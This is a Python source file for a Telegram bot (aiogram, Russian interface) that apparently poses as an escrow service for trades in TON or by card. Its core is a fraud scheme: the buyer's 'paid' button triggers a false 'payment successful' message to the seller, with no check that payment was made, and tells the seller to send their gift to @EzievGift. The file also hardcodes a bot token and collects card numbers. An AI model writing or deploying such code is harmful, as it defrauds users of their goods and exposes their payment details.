from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor

# Твой токен
API_TOKEN = "8480844262:AAF5x1hyQCVuF1PeK26sP5lCfhNVISmQ9E8"

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

# Словарь для хранения реквизитов пользователей
user_wallets = {}
user_cards = {}

# Стартовое меню
@dp.message_handler(commands=["start"])
async def send_welcome(message: types.Message):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add("📨 Управление реквизитами", "📄 Создать сделку")
    await message.answer("EZIEV 🎁", reply_markup=keyboard)

# Управление реквизитами
@dp.message_handler(lambda msg: msg.text == "📨 Управление реквизитами")
async def manage_wallets(message: types.Message):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add("Добавить / изменить TON-кошелёк", "Добавить / изменить карту")
    keyboard.add("⬅️ Назад")
    await message.answer("Управление реквизитами:", reply_markup=keyboard)

@dp.message_handler(lambda msg: msg.text == "Добавить / изменить TON-кошелёк")
async def add_wallet(message: types.Message):
    await message.answer("Введите адрес вашего TON-кошелька:")
    dp.register_message_handler(save_wallet, content_types=["text"], state=None)

async def save_wallet(message: types.Message):
    user_wallets[message.from_user.id] = message.text.strip()
    await message.answer("✅ TON-кошелёк сохранён.")

@dp.message_handler(lambda msg: msg.text == "Добавить / изменить карту")
async def add_card(message: types.Message):
    await message.answer("Введите номер вашей карты:")
    dp.register_message_handler(save_card, content_types=["text"], state=None)

async def save_card(message: types.Message):
    user_cards[message.from_user.id] = message.text.strip()
    await message.answer("✅ Карта сохранена.")

# Создание сделки
@dp.message_handler(lambda msg: msg.text == "📄 Создать сделку")
async def create_deal(message: types.Message):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add("💎 На TON-кошелёк", "💳 На карту")
    keyboard.add("⬅️ Назад")
    await message.answer("Выберите способ получения оплаты:", reply_markup=keyboard)

@dp.message_handler(lambda msg: msg.text in ["💎 На TON-кошелёк", "💳 На карту"])
async def ask_amount(message: types.Message):
    method = message.text
    dp.register_message_handler(lambda m: save_amount(m, method), content_types=["text"], state=None)
    await message.answer("Введите сумму сделки в TON:")

async def save_amount(message: types.Message, method):
    amount = message.text.strip()
    await message.answer(f"Укажите, что вы предлагаете в этой сделке за {amount} TON:\n"
                         f"Пример: 10 кепок и Пепе...")
    dp.register_message_handler(lambda m: save_description(m, method, amount), content_types=["text"], state=None)

async def save_description(message: types.Message, method, amount):
    description = message.text.strip()
    link = f"https://t.me/{(await bot.get_me()).username}?start=deal_{message.from_user.id}"

    await message.answer(
        f"✅ Сделка успешно создана\n\n"
        f"Сумма: {amount} TON\n"
        f"Вы предлагаете: {description}\n"
        f"Ссылка для покупателя: {link}\n"
        f"Продавец: @{message.from_user.username}\n\n"
        f"Мы сообщим вам, как только покупатель оплатит подарок."
    )

# Покупатель открывает сделку
@dp.message_handler(lambda msg: msg.text.startswith("/start deal_"))
async def buyer_view(message: types.Message):
    seller_id = int(message.text.split("_")[1])
    wallet = user_wallets.get(seller_id, "не указан")
    card = user_cards.get(seller_id, "не указана")

    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(types.InlineKeyboardButton("✅ Оплатил", callback_data=f"paid_{seller_id}"))

    await message.answer(
        f"Вы собираетесь оплатить сделку.\n\n"
        f"Реквизиты продавца:\n\n"
        f"💎 TON: {wallet}\n"
        f"💳 Карта: {card}\n",
        reply_markup=keyboard
    )

# Покупатель нажимает "Оплатил"
@dp.callback_query_handler(lambda call: call.data.startswith("paid_"))
async def payment_done(call: types.CallbackQuery):
    seller_id = int(call.data.split("_")[1])
    await bot.send_message(
        seller_id,
        "Оплата произведена успешно ✅\n\n"
        f"Чтобы мы подтвердили оплату, вам необходимо отправить свой подарок пользователю @EzievGift "
        "и прикрепить скриншот сюда."
    )
    await call.message.answer("Спасибо! Ваш продавец будет уведомлён. ✅")

if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
